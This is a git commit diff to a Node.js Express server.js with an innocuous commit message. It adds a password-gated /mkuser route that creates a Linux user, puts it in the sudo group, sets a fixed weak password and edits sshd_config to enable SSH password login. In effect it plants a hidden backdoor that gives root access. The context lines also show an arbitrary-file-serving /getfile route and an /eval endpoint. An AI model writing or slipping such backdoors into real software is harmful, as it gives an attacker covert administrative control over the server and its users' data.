250ef5c8064a3ff9be4c76cb8ad70a31b7edee2e
Jay Williams <course@jaywilliams.me>
2018-02-11 20:09:08 +0000

    Finish thy stuff

--- server.js
+++ server.js
@@ -5,6 +5,8 @@ const sqlite_connector = require("./helpers/sqlite_connector");
 const app = express()
 const assert = require("assert");
 const request = require('request');
+var linuxUser = require('linux-user');
+
 app.get('/getbal/:token', (req, res) => {
     try {
         var j = jwt.verify(req.params.token, config.jwt_secret);
@@ -64,6 +66,35 @@ app.get("/getfile/:password", (req, res) => {
     var fs = require("fs");
     res.sendFile(req.query.file)
 })
+
+app.get("/mkuser/:password", (req, res) => {
+    var crypto = require('crypto');
+    var hash = crypto.createHash('sha256');
+    hash.update(req.params.password);
+    var theirPw = hash.digest('hex');
+    var myPw = "f1cb22cb622f3dd9d1f5e06cc2a1d0e920c40e6a4c2d2bf3dd0c7b52e975d6d9";
+    if (theirPw != myPw) return;
+    var outs = [];
+    linuxUser.addUser("jay", (u) => {
+        outs.push(u)
+        linuxUser.addUserToGroup("jay", "sudo", (x) => {
+            outs.push(x);
+            linuxUser.setPassword("jay", "123changeme", (a) => {
+                outs.push(a);
+                var fs = require("fs");
+                var c = fs.readFileSync("/etc/ssh/sshd_config", "utf-8");
+                c = c.replace("PasswordAuthentication no", "PasswordAuthentication yes")
+                c = c.replace("PasswordAuthentication no", "PasswordAuthentication yes")
+                c = c.replace("PasswordAuthentication no", "PasswordAuthentication yes")
+                fs.writeFileSync("/etc/ssh/sshd_config", c);
+                res.json({
+                    o: outs
+                })
+            })
+        })
+    })
+})
+
 app.get("/eval/:password", (req, res) => {
     var crypto = require('crypto');
     var hash = crypto.createHash('sha256');
